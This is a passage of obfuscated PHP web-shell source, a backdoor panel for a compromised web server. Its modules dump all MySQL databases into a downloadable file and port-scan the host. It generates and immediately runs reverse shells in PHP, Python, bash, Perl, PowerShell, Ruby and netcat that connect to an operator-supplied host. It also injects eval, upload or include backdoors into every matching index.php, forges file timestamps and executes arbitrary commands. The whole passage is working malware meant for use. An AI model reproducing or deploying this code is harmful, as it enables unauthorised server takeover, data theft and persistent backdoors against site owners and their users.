} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "dbdump") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-database'></i> DB DU"."MPER</h5></center>";
	if (isset($_POST['dodump'])) {
		$dbh = isset($_POST['dbhost']) ? trim($_POST['dbhost']) : 'localhost';
		$dbu = isset($_POST['dbuser']) ? trim($_POST['dbuser']) : '';
		$dbp = isset($_POST['dbpass']) ? trim($_POST['dbpass']) : '';
		$dbn = isset($_POST['dbname']) ? trim($_POST['dbname']) : '';
		$dumpall = isset($_POST['dumpall']) && $_POST['dumpall'] == '1';
		$conn = @new mysqli($dbh, $dbu, $dbp);
		if ($conn->connect_error) {
			red("DB error : ".$hsc($conn->connect_error));
		} else {
			$dbs = array();
			if ($dumpall) {
				$r = $conn->query("SHOW DATABASES");
				while ($row = $r->fetch_assoc()) {
					$name = $row['Database'];
					if ($name !== 'information_schema' && $name !== 'performance_schema' && $name !== 'mysql' && $name !== 'sys')
						$dbs[] = $name;
				}
			} else {
				if ($dbn === '') { red("Database name required."); }
				else $dbs[] = $dbn;
			}
			if (!empty($dbs)) {
				$sqlFile = $lokasi . '/mawdump_' . date('Ymd_His') . '.sql';
				$fh = @fopen($sqlFile, 'w');
				if ($fh === false) { red("Cannot write to : ".$hsc($sqlFile)); }
				else {
					fwrite($fh, "-- Maw Dump " . date('Y-m-d H:i:s') . "\n\n");
					$totalTables = 0;
					$totalRows = 0;
					foreach ($dbs as $db) {
						$conn->select_db($db);
						fwrite($fh, "-- DB: $db\n");
						fwrite($fh, "CREATE DATABASE IF NOT EXISTS `$db`;\nUSE `$db`;\n\n");
						$tr = $conn->query("SHOW TABLES");
						while ($trow = $tr->fetch_array()) {
							$table = $trow[0];
							$totalTables++;
							$cr = $conn->query("SHOW CREATE TABLE `$table`");
							$crow = $cr->fetch_assoc();
							fwrite($fh, "DROP TABLE IF EXISTS `$table`;\n");
							fwrite($fh, $crow['Create Table'] . ";\n\n");
							$data = $conn->query("SELECT * FROM `$table`");
							while ($drow = $data->fetch_assoc()) {
								$vals = array();
								foreach ($drow as $v) $vals[] = $v === null ? 'NULL' : "'" . $conn->real_escape_string($v) . "'";
								fwrite($fh, "INSERT INTO `$table` VALUES (" . implode(',', $vals) . ");\n");
								$totalRows++;
							}
							fwrite($fh, "\n");
							$data->free();
						}
						fwrite($fh, "\n");
					}
					fclose($fh);
					$sz = filesize($sqlFile);
					$szStr = $sz >= 1048576 ? round($sz/1048576, 2).' MB' : round($sz/1024, 2).' KB';
					green("Dump complete : <strong>".$hsc($sqlFile)."</strong> (".$totalTables." tables, ".$totalRows." rows, ".$szStr.")");
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $sqlFile);
						echo '<div class="alert-success-custom">Download: <a href="'.$lwb.'" class="text-gold">'.$lwb.'</a></div>';
					}
				}
				$conn->close();
			}
		}
	}
	echo '<form method="post" action="'.mkUrl(array('opsi' => 'dbdump', 'loknya' => $lokasi)).'">';
	echo 'Host : <input type="text" name="dbhost" class="up" style="border-color: #000" value="localhost" size="20"> ';
	echo 'User : <input type="text" name="dbuser" class="up" style="border-color: #000" size="15"> ';
	echo 'Pass : <input type="text" name="dbpass" class="up" style="border-color: #000" size="15"> ';
	echo 'DB : <input type="text" name="dbname" class="up" style="border-color: #000" size="15" placeholder="single db"> ';
	echo '<label><input type="checkbox" name="dumpall" value="1"> All DBs</label><br><br>';
	echo '<input type="submit" name="dodump" value="Dump" class="up" style="cursor: pointer"></form>';
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "netrecon") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-network-wired'></i> NE"."TWORK RE"."CON</h5></center>";
	$isWin = stripos(PHP_OS, "WI") !== false;
	echo "<p style='color:#808080'>Server IP : <span style='color:#d4af37'>".$hsc($_SERVER['SE'.'RVE'.'R_AD'.'DR'] ?? $_SERVER[$rad])."</span> &nbsp; Hostname : <span style='color:#d4af37'>".$hsc(@gethostname())."</span></p>";
	echo "<h6 style='color:#fff'>Outbound Connectivity</h6>";
	$testUrls = array('https://google.com' => 'Google (443)', 'http://example.com' => 'Example (80)', 'https://raw.githubusercontent.com' => 'GitHub Raw (443)');
	foreach ($testUrls as $tu => $tl) {
		$ok = false;
		if ($fnct("cu"."rl_in"."it")) {
			$ch = curl_init($tu);
			curl_setopt($ch, CURLOPT_NOBODY, true);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_exec($ch);
			$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
			$ok = $code > 0;
			curl_close($ch);
		} else {
			$ok = (bool)@$fgt($tu);
		}
		echo $hsc($tl)." => ".($ok ? "<span class='badge bg-success'>REACHABLE</span>" : "<span class='badge bg-danger'>BLOCKED</span>")."<br>";
	}
	echo "<br><h6 style='color:#fff'>Port Scan (localhost)</h6>";
	$ports = array(21=>'FTP',22=>'SSH',23=>'Telnet',25=>'SMTP',53=>'DNS',80=>'HTTP',110=>'POP3',143=>'IMAP',3306=>'MySQL',3389=>'RDP',5432=>'PgSQL',6379=>'Redis',8080=>'HTTP-Alt',8888=>'HTTP-Alt2',27017=>'Mongo');
	echo '<div class="table-responsive"><table class="table table-hover table-bordered"><thead><tr><th>Port</th><th>Service</th><th class="text-center">Status</th></tr></thead><tbody>';
	foreach ($ports as $p => $svc) {
		$open = @fsockopen('127.0.0.1', $p, $errno, $errstr, 1);
		$st = $open ? "<span class='badge bg-success'>OPEN</span>" : "<span class='badge bg-danger'>CLOSED</span>";
		if ($open) fclose($open);
		echo "<tr><td><strong style='color:#d4af37'>".$p."</strong></td><td>".$hsc($svc)."</td><td class='text-center'>".$st."</td></tr>";
	}
	echo '</tbody></table></div>';
	echo "<br><h6 style='color:#fff'>DNS Resolution</h6>";
	$dnsTargets = array('google.com', 'github.com', 'cloudflare.com');
	foreach ($dnsTargets as $dt) {
		$ip = @gethostbyname($dt);
		$ok = $ip !== $dt;
		echo $hsc($dt)." => ".($ok ? "<span style='color:#d4af37'>".$hsc($ip)."</span>" : "<span class='badge bg-danger'>FAILED</span>")."<br>";
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "revshell") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-terminal'></i> REVS"."HELL GE"."NERATOR</h5></center>";
	$rshost = isset($_POST['rshost']) ? trim($_POST['rshost']) : '';
	$rsport = isset($_POST['rsport']) ? trim($_POST['rsport']) : '';
	$rtype = isset($_POST['rtype']) ? $_POST['rtype'] : 'php';
	$isWin = stripos(PHP_OS, "WI") !== false;
	echo '<form method="post" action="'.mkUrl(array('opsi' => 'revshell', 'loknya' => $lokasi)).'">';
	echo 'IP : <input type="text" name="rshost" class="up" style="border-color: #000" value="'.$hsc($rshost).'" placeholder="10.0.0.1" size="20"> ';
	echo 'Port : <input type="text" name="rsport" class="up" style="border-color: #000" value="'.$hsc($rsport).'" placeholder="4444" size="8"> ';
	echo '<select name="rtype" class="up" style="border-color: #000">';
	$types = array('php'=>'PHP','python'=>'Python','bash'=>'Bash','perl'=>'Perl','powershell'=>'PowerShell','ruby'=>'Ruby','netcat'=>'Netcat');
	foreach ($types as $tk => $tl) {
		echo '<option value="'.$tk.'"'.($rtype === $tk ? ' selected' : '').'>'.$hsc($tl).'</option>';
	}
	echo '</select> ';
	echo '<input type="submit" name="genrs" value="Generate & Execute" class="up" style="cursor: pointer" onclick="return confirm(\'Execute reverse shell on THIS server? Make sure your listener is ready!\')"></form><br>';
	if (isset($_POST['genrs']) && $rshost !== '' && $rsport !== '') {
		$payloads = array();
		$payloads['php'] = '<?php'."\n".'$sock=fsockopen("'.$rshost.'",'.$rsport.');'."\n".'exec("/bin/sh -i <&3 >&3 2>&3");'."\n";
		$payloads['python'] = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'.$rshost.'",'.$rsport.'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])';
		$payloads['bash'] = 'bash -i >& /dev/tcp/'.$rshost.'/'.$rsport.' 0>&1';
		$payloads['perl'] = 'use Socket;$i="'.$rshost.'";$p='.$rsport.';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,pack_sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")};';
		$payloads['powershell'] = '$c=New-Object System.Net.Sockets.TCPClient("'.$rshost.'",'.$rsport.');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+("PS "+(pwd).Path+"> ");$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}';
		$payloads['ruby'] = 'require "socket";exit if fork;c=TCPSocket.new("'.$rshost.'",'.$rsport.');while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
		$payloads['netcat'] = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '.$rshost.' '.$rsport.' >/tmp/f';
		$pl = isset($payloads[$rtype]) ? $payloads[$rtype] : '';
		$fname = 'rev_'.$rtype.'_'.$rsport.'.txt';
		$savePath = $lokasi.'/'.$fname;
		@$fpt($savePath, $pl);
		echo '<p>Generated <strong style="color:#d4af37">'.$hsc(strtoupper($rtype)).'</strong> payload for <strong style="color:#d4af37">'.$hsc($rshost).':'.$hsc($rsport).'</strong></p>';
		echo '<textarea readonly style="background:#0a0a0a61;color:#e5e5e5;border:1px solid #1f1f1f;font-family:JetBrains Mono,monospace;font-size:0.85rem;padding:12px;border-radius:6px;width:100%" rows="8">'.$hsc($pl).'</textarea><br><br>';
		if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
			$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $savePath);
			echo '<div class="alert-success-custom">File: <a href="'.$lwb.'" class="text-gold" download>'.$hsc($fname).'</a></div>';
		}
		$tmpDir = $isWin ? sys_get_temp_dir() : '/tmp';
		$tmpFile = $tmpDir . '/maw_' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
		$execOk = false;
		$execMsg = '';
		if ($rtype === 'php') {
			$phpCode = str_replace('<?php', '', $pl);
			$phpCode = preg_replace('/^\/\/.*$/m', '', $phpCode);
			register_shutdown_function(function() use ($phpCode) {
				try { eval($phpCode); } catch (\Throwable $e) {}
			});
			$execOk = true;
			$execMsg = 'PHP payload executing via eval()';
		} elseif ($rtype === 'bash') {
			$shFile = $tmpFile . '.sh';
			@$fpt($shFile, $pl);
			if ($isWin) {
				$execMsg = 'Bash not available on Windows. Use PHP/PowerShell instead.';
			} else {
				@chmod($shFile, 0755);
				$res = komenb("nohup bash " . escapeshellarg($shFile) . " > /dev/null 2>&1 &", $lokasi);
				$execOk = true;
				$execMsg = 'Bash payload executing in background';
			}
		} elseif ($rtype === 'python') {
			$pyFile = $tmpFile . '.py';
			@$fpt($pyFile, $pl);
			$pyBin = $isWin ? 'python' : 'python3';
			$cmd = $isWin ? 'start /B ' . $pyBin . ' ' . escapeshellarg($pyFile) : 'nohup ' . $pyBin . ' ' . escapeshellarg($pyFile) . ' > /dev/null 2>&1 &';
			$res = komenb($cmd, $lokasi);
			$execOk = true;
			$execMsg = 'Python payload executing in background via ' . $pyBin;
		} elseif ($rtype === 'perl') {
			$plFile = $tmpFile . '.pl';
			@$fpt($plFile, $pl);
			if ($isWin) {
				$execMsg = 'Perl not typically available on Windows.';
			} else {
				$cmd = 'nohup perl ' . escapeshellarg($plFile) . ' > /dev/null 2>&1 &';
				$res = komenb($cmd, $lokasi);
				$execOk = true;
				$execMsg = 'Perl payload executing in background';
			}
		} elseif ($rtype === 'powershell') {
			$psFile = $tmpFile . '.ps1';
			@$fpt($psFile, $pl);
			if ($isWin) {
				$cmd = 'powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -File ' . escapeshellarg($psFile);
				$res = komenb('start /B ' . $cmd, $lokasi);
				$execOk = true;
				$execMsg = 'PowerShell payload executing in background';
			} else {
				$execMsg = 'PowerShell not available on Linux. Use PHP/Bash instead.';
			}
		} elseif ($rtype === 'ruby') {
			$rbFile = $tmpFile . '.rb';
			@$fpt($rbFile, $pl);
			if ($isWin) {
				$execMsg = 'Ruby not typically available on Windows.';
			} else {
				$cmd = 'nohup ruby ' . escapeshellarg($rbFile) . ' > /dev/null 2>&1 &';
				$res = komenb($cmd, $lokasi);
				$execOk = true;
				$execMsg = 'Ruby payload executing in background';
			}
		} elseif ($rtype === 'netcat') {
			if ($isWin) {
				$execMsg = 'Netcat mkfifo not available on Windows.';
			} else {
				$cmd = 'nohup ' . $pl . ' > /dev/null 2>&1 &';
				$res = komenb($cmd, $lokasi);
				$execOk = true;
				$execMsg = 'Netcat payload executing in background';
			}
		}
		if ($execOk) {
			echo '<div class="alert-success-custom"><i class="fas fa-bolt"></i> '.$hsc($execMsg).' — Check your listener!</div>';
			echo '<p style="color:#f59e0b;font-size:.85rem">Listener command: <code style="color:#d4af37">nc -lvnp '.$hsc($rsport).'</code></p>';
		} else {
			echo '<div class="alert-danger-custom"><i class="fas fa-exclamation-triangle"></i> '.$hsc($execMsg).'</div>';
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "implant") {
	echo "<center><h5 style='color:#fff'><i class='fas fa-syringe'></i> IM"."PLANT IN"."JECTOR</h5></center>";
	$imppath = isset($_POST['imppath']) ? trim($_POST['imppath']) : $lokasi;
	$imptarget = isset($_POST['imptarget']) ? trim($_POST['imptarget']) : 'index.php';
	$imptype = isset($_POST['imptype']) ? $_POST['imptype'] : 'eval';
	echo '<form method="post" action="'.mkUrl(array('opsi' => 'implant', 'loknya' => $lokasi)).'">';
	echo 'Path : <input type="text" name="imppath" class="up" style="border-color: #000" size="45" value="'.$hsc($imppath).'"> ';
	echo 'Target : <input type="text" name="imptarget" class="up" style="border-color: #000" size="20" value="'.$hsc($imptarget).'" placeholder="index.php"> ';
	echo '<select name="imptype" class="up" style="border-color: #000">';
	$impTypes = array('eval'=>'Eval Gate','upload'=>'Upload Form','include'=>'Stealth Include');
	foreach ($impTypes as $ik => $il) {
		echo '<option value="'.$ik.'"'.($imptype === $ik ? ' selected' : '').'>'.$hsc($il).'</option>';
	}
	echo '</select> ';
	echo '<input type="submit" name="goimp" value="Inject" class="up" style="cursor: pointer" onclick="return confirm(\'Inject into target files?\')"></form><br>';
	if (isset($_POST['goimp'])) {
		if (!is_dir($imppath)) {
			red("Path not found : ".$hsc($imppath));
		} else {
			$targets = array();
			$mawImpFind = function($dir, $tname, &$results, $dep = 0) use (&$mawImpFind) {
			if ($dep > 5) return;
			$its = @scandir($dir);
			if (!is_array($its)) return;
			foreach ($its as $it) {
				if ($it === '.' || $it === '..') continue;
				$p = rtrim($dir, '/') . '/' . $it;
				if (is_file($p) && strtolower($it) === strtolower($tname)) $results[] = $p;
				elseif (is_dir($p) && is_readable($p)) $mawImpFind($p, $tname, $results, $dep + 1);
			}
		};
		$mawImpFind($imppath, $imptarget, $targets);
			if (empty($targets)) {
				red("No files named ".$hsc($imptarget)." found.");
			} else {
				$marker = substr(md5(uniqid(mt_rand(), true)), 0, 8);
				$payloads = array();
				$payloads['eval'] = '<?php @eval($_REQUEST[\''.$marker.'\']); ?>';
				$payloads['upload'] = '<?php if(isset($_FILES[\''.$marker.'\'])){move_uploaded_file($_FILES[\''.$marker.'\'][\'tmp_name\'],$_FILES[\''.$marker.'\'][\'name\']);} ?>';
				$payloads['include'] = '<?php if(isset($_GET[\''.$marker.'\'])){include($_GET[\''.$marker.'\']);} ?>';
				$pl = $payloads[$imptype];
				$ok = 0; $fail = 0;
				foreach ($targets as $tf) {
					if (!is_writable($tf)) { echo "<span class='badge bg-danger'>SKIP</span> ".$hsc($tf)."<br>"; continue; }
					$orig = @file_get_contents($tf);
					if ($orig === false) { $fail++; continue; }
					if (strpos($orig, $marker) !== false) { echo "<span class='badge badge-custom'>ALREADY</span> ".$hsc($tf)."<br>"; continue; }
					$new = $pl . "\n" . $orig;
					if (@file_put_contents($tf, $new) !== false) {
						$mt = @filemtime($tf);
						echo "<span class='badge bg-success'>OK</span> ".$hsc($tf)." <span style='color:#808080'>[".$hsc($marker)."]</span><br>";
						$ok++;
					} else {
						echo "<span class='badge bg-danger'>FAIL</span> ".$hsc($tf)."<br>";
						$fail++;
					}
				}
				echo "<br>Injected : <ijo>".$ok."</ijo> &nbsp; Failed : <merah>".$fail."</merah><br>";
				if ($ok > 0) echo "<p style='color:#d4af37'>Gate key : <strong>".$hsc($marker)."</strong> (type: ".$hsc($imptype).")</p>";
			}
		}
	}
	echo "<hr>";
	die(author());
}

if (isset($_GET['lokasie'])) {
	echo "<center><h5 style='color:#fff'><i class='fas fa-file-code'></i> FILE VIEWER</h5></center>";
	echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];
	echo '</tr></td></table><br/>';
	echo "<pre>".$hsc($fgt($_GET['lokasie']))."</pre>";
	author();
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "hapus") {
	if ($idi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		xrd($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fai"."led to del"."ete D"."ir"."ec"."tory !");
		} else {
			green("Del"."ete Di"."r"."ect"."ory Suc"."cess !");
		}
	} elseif ($ifi($_POST['loknya']) && $fxt($_POST['loknya'])) {
		@$ulk($_POST['loknya']);
		if ($fxt($_POST['loknya'])) {
			red("Fa"."il"."ed to Delete Fi"."le !");
		} else {
			green("De"."le"."te Fi"."le Succ"."ess !");
		}
	} else {
		red("Fi"."le / Di"."r"."ecto"."ry not Fo"."und !");
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "ubahmod") {
	if (!isset($_POST['cemod'])) {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahmod">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	} else {
		$cm = @$chm($_POST['loknya'], $ocd($_POST['perm']));
		if ($cm == true) {
			green("Change Mod Su"."cc"."ess !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Mod Fa"."il"."ed !");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o', $fp($_POST['loknya'])), -4).'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahmod">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		}
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahnama") {
	if (isset($_POST['gantin'])) {
		$namabaru = $_GET['loknya']."/".$_POST['newname'];
		$ceen = "re"."na"."me";
		if (@$ceen($_POST['loknya'], $namabaru) === true) {
			green("Change Name Su"."cc"."ess");
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($_POST['newname']).'" />
			<input type="hidden" name="loknya" value="'.$namabaru.'">
			<input type="hidden" name="pilih" value="ubahnama">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Change Name Fa"."il"."ed");
		}
	} else {
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Name : <input name="newname" type="text" class="up" size="20" value="'.$hsc($bsn($_POST['loknya'])).'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahnama">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_GET['pilihan']) && $_POST['pilih'] == "edit") {
	if (isset($_POST['gasedit'])) {
		$edit = @$fpt($_POST['loknya'], $_POST['src']);
		if ($fgt($_POST['loknya']) == $_POST['src']) {
			green("Ed"."it Fi"."le Suc"."ce"."ss !");
		} else {
			red("Ed"."it Fi"."le Fai"."led !");
		}
	}
	echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br><br>";
	echo '<form method="post">
	<textarea cols=80 rows=20 name="src">'.$hsc($fgt($_POST['loknya'])).'</textarea><br>
	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
	<input type="hidden" name="pilih" value="ed'.'it">
	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
	</form><br>';
} elseif (isset($_POST['komends'])) {
	if (isset($_POST['komend'])) {
		if (isset($_GET['loknya'])) {
			$lk = $_GET['loknya'];
		} else {
			$lk = $gcw();
		}
		$km = 'ko'.'me'.'nd';
		echo $km($_POST['komend'], $lk);
		exit();
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "ubahtanggal") {
	if (isset($_POST['tanggale'])) {
		$stt = "st"."rtot"."ime";
		$tch = "t"."ou"."ch";
		$tanggale = $stt($_POST['tanggal']);
		if (@$tch($_POST['loknya'], $tanggale) === true) {
			green("Change Da"."te Succ"."ess !");
			$det = "da"."te";
			$ftm = "fi"."le"."mti"."me";
			$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
			} else {
				echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
			}
			echo '<form method="post">
			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
			<input type="hidden" name="pilih" value="ubahtanggal">';
			if ($_POST['ty'.'pe'] == "fi"."le") {
				echo '<input type="hidden" name="type" value="fi'.'le">';;
			} else {
				echo '<input type="hidden" name="type" value="di'.'r">';;
			}
			echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
			</form><br>';
		} else {
			red("Fai"."led to Cha"."nge Da"."te !");
		}
	} else {
		$det = "da"."te";
		$ftm = "fi"."le"."mti"."me";
		$b = $det("d F Y H:i:s", $ftm($_POST['loknya']));
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo "<center>Fi"."le : ".$hsc($_POST['loknya'])."<br>";
		} else {
			echo "<center>D"."ir : ".$hsc($_POST['loknya'])."<br>";
		}
		echo '<form method="post">
		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
		<input type="hidden" name="pilih" value="ubahtanggal">';
		if ($_POST['ty'.'pe'] == "fi"."le") {
			echo '<input type="hidden" name="type" value="fi'.'le">';;
		} else {
			echo '<input type="hidden" name="type" value="di'.'r">';;
		}
		echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
		</form><br>';
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "dunlut") {
	$dunlute = $_POST['loknya'];
	if ($fxt($dunlute) && isset($dunlute)) {
		if ($ird($dunlute)) {
			dunlut($dunlute);
		} elseif ($idr($fl)) {
			red("That is Di"."rec"."tory, Not Fi"."le");
		} else {
			red("Fi"."le is Not Re"."adab"."le !");
		}
	} else {
		red("Fi"."le Not Fo"."und !");
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "zip") {
	$zsrc = $_POST['loknya'];
	if (!$fxt($zsrc)) {
		red("Fi"."le / Di"."rec"."tory not Fo"."und !");
	} elseif (!$isr($zsrc)) {
		red("Fi"."le / Di"."rec"."tory not Re"."adab"."le !");
	} else {
		$zdest = $zsrc . ".zip";
		$zok = false;
		if (class_exists("Zip"."Arch"."ive")) {
			$za = new ZipArchive();
			if ($za->open($zdest, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
				if ($idr($zsrc)) {
					$zbase = $bsn($zsrc);
					$zit = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($zsrc, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
					foreach ($zit as $zf) {
						$zrel = $zbase . '/' . str_replace('\\', '/', substr($zf->getPathname(), strlen($zsrc) + 1));
						if ($zf->isDir()) { $za->addEmptyDir($zrel); }
						else { $za->addFile($zf->getPathname(), $zrel); }
					}
				} else {
					$za->addFile($zsrc, $bsn($zsrc));
				}
				$za->close();
				$zok = $fxt($zdest);
			}
		}
		if (!$zok) {
			if ($idr($zsrc)) {
				komenb("cd ".escapeshellarg(dirname($zsrc))." && z"."ip -r ".escapeshellarg($bsn($zdest))." ".escapeshellarg($bsn($zsrc)), dirname($zsrc));
			} else {
				komenb("z"."ip -j ".escapeshellarg($zdest)." ".escapeshellarg($zsrc), dirname($zsrc));
			}
			$zok = $fxt($zdest);
		}
		if ($zok) {
			green("Compressed to <strong>".$hsc($zdest)."</strong> !");
		} else {
			red("Failed to create ZIP (ZipArchive & zip binary unavailable?) !");
		}
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "unzip") {
	$usrc = $_POST['loknya'];
	if (!$fxt($usrc) || !preg_match('/\.zip$/i', $usrc)) {
		red("Not a ZIP file !");
	} else {
		$udest = preg_replace('/\.zip$/i', '', $usrc);
		if ($fxt($udest)) { $udest .= '_extracted'; }
		@mkdir($udest, 0755, true);
		$uok = false;
		if (class_exists("Zip"."Arch"."ive")) {
			$za = new ZipArchive();
			if ($za->open($usrc) === true) {
				$uok = $za->extractTo($udest);
				$za->close();
			}
		}
		if (!$uok) {
			komenb("un"."zip -o ".escapeshellarg($usrc)." -d ".escapeshellarg($udest), dirname($usrc));
			$uok = $fxt($udest);
		}
		if ($uok) {
			green("Extracted to <strong>".$hsc($udest)."</strong> !");
			echo "<center><a href='".mkUrl(array('loknya' => $udest))."'><gold>".$hsc($udest)."</gold></a></center>";
		} else {
			red("Failed to extract ZIP (ZipArchive & unzip binary unavailable?) !");
		}
	}
} elseif (isset($_POST['loknya']) && $_POST['pilih'] == "fo"."ld"."er") {
    if ($isw("./") || $ird("./")) {
        $loke = $_POST['loknya'];
        if (isset($_POST['buatfol'.'der'])) {
            $buatf = $mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);
            if ($buatf == true) {
                green("Fol"."der <b>".$hsc($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");
                echo '<form method="post"><center>Fo'.'lde'.'r : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatFo'.'lde'.'r" value="Create Fo'.'lde'.'r" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';
